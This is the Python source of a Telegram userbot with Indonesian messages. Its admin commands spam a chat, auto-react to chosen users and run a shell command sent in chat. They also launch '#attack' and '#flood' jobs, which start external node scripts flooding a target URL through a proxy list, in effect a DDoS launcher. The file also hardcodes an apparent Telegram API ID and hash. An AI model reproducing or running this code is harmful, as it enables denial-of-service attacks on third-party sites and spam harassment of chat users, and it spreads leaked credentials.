import asyncio
from telethon import TelegramClient, events
from telethon.tl.functions.messages import SendReactionRequest
from telethon.tl.types import ReactionEmoji
import time
import subprocess
import requests

api_id = 24415926  # masukkan API ID Anda di sini
api_hash = '568bf3210f4ae6541fa30818a8f9360c'  # masukkan API Hash Anda di sini
admin_id = 6803990183  # masukkan ID admin Anda di sini


client = TelegramClient('userbot_session', api_id, api_hash)

reacting_users = {}
spamming = False

def is_admin(user_id):
    return user_id == admin_id

@client.on(events.NewMessage(pattern=r"#react\s*(.*)"))
async def react(event):
    if not is_admin(event.sender_id):
        return

    emoji = event.pattern_match.group(1).strip()
    
    if not event.is_reply:
        await event.reply("Replay chat user")
        return

    if not emoji:
        await event.reply("Format salah. Gunakan #react [emoji].")
        return

    replied_msg = await event.get_reply_message()
    user_id = replied_msg.sender_id

    reacting_users[user_id] = emoji
    await event.reply(f"react with {emoji}")

@client.on(events.NewMessage(pattern=r"#unreact"))
async def unreact(event):
    if not is_admin(event.sender_id):
        return

    if not event.is_reply:
        await event.reply("Reply chat orang bro")
        return

    replied_msg = await event.get_reply_message()
    user_id = replied_msg.sender_id

    if user_id in reacting_users:
        del reacting_users[user_id]
        await event.reply(f"Stop React {user_id}")
    else:
        await event.reply(f"Not found react {user_id}")

@client.on(events.NewMessage)
async def auto_react(event):
    if event.sender_id in reacting_users:
        emoji = reacting_users[event.sender_id]
        try:
            await client(SendReactionRequest(
                peer=event.peer_id,
                msg_id=event.id,
                reaction=[ReactionEmoji(emoticon=emoji)]
            ))
        except Exception as e:
            print(f"Failed to react: {str(e)}")


@client.on(events.NewMessage(pattern=r'^#spam (.*)( \d+)$'))  # Handle #spam command with message and count
async def spam(event):
    global spamming

    if not is_admin(event.sender_id):
        return

    if spamming:
        await event.respond('Sedang dalam proses spamming, gunakan #unspam untuk menghentikannya.')
        return

    args = event.pattern_match.groups()

    message = args[0]
    count = int(args[1])

    spamming = True

    for _ in range(count):
        if not spamming:
            break
        await client.send_message(event.chat_id, message)

    spamming = False


@client.on(events.NewMessage(pattern=r'^#unspam$'))  # Handle #unspam command
async def unspam(event):
    global spamming

    if not is_admin(event.sender_id):
        return

    spamming = False
    await event.respond('Spam berhasil dihentikan.')


@client.on(events.NewMessage(pattern=r'^#spam$'))  # Handle invalid #spam command
async def invalid_spam(event):
    await event.respond('Format yang salah! Gunakan #spam [pesan] [count] atau #unspam.')

@client.on(events.NewMessage(pattern=r'#attack( |$)'))
async def handle_attack(event):
    if not is_admin(event.sender_id):
        return

    if len(event.raw_text.split()) == 1:
        await event.reply('Format salah. Contoh penggunaan: #attack [url] [port] [time] [count]')
        return
    elif len(event.raw_text.split()) == 5:
        _, url, port, time, count = event.raw_text.split()
        cmd = f'screen -dm node attack.js {url} {time} 25 10 proxy.txt'
        for _ in range(int(count)):
            subprocess.run(cmd, shell=True)
        await event.reply(f'Attack Started\n\nTarget: {url}\nPort: {port}\nTime: {time}\nCount: {count}\n\n@sedihbetgw - FebryEnsz')
    else:
        await event.reply('Format salah. Contoh penggunaan: #attack [url] [port] [time] [count]')
        return

@client.on(events.NewMessage(pattern=r'#flood( |$)'))
async def handle_flood(event):
    if not is_admin(event.sender_id):
        return

    if len(event.raw_text.split()) == 1:
        await event.reply('Format salah. Contoh penggunaan: #flood [url] [port] [time] [count]')
        return
    elif len(event.raw_text.split()) == 5:
        _, url, port, time, count = event.raw_text.split()
        cmd = f'screen -dm node flood.js {url} {time} 25 10 proxy.txt'
        for _ in range(int(count)):
            subprocess.run(cmd, shell=True)
        await event.reply(f'Flood Attack Started\n\nTarget: {url}\nPort: {port}\nTime: {time}\nCount: {count}\n\n@sedihbetgw - FebryEnsz')
    else:
        await event.reply('Format salah. Contoh penggunaan: #flood [url] [port] [time] [count]')
        return

@client.on(events.NewMessage(pattern=r'#stop'))
async def handle_stop(event):
    if not is_admin(event.sender_id):
        return

    subprocess.run('killall screen', shell=True)
    await event.reply('All Attack Has Stop')

@client.on(events.NewMessage(pattern=r'^#alive$'))  # Handle #ping command
async def ping(event):
    start_time = time.time()

    message = await client.send_message(event.chat_id, 'I Am Alive ...')
    end_time = time.time()

    elapsed_time = (end_time - start_time) * 1000

    await message.edit(f'I Am Alive\nPing: {elapsed_time:.3f} ms')

@client.on(events.NewMessage(pattern=r'exe( |$)'))
async def handle_exe(event):
    if not is_admin(event.sender_id):
        return

    if len(event.raw_text.split()) == 1:
        await event.reply('Format salah. Contoh penggunaan: exe [command]')
        return
    else:
        _, command = event.raw_text.split(maxsplit=1)
        output = subprocess.getoutput(command)
        await event.reply(f'Output:\n\n{output}')

async def main():
    await client.start()
    await client.run_until_disconnected()

if __name__ == '__main__':
    client.loop.run_until_complete(main())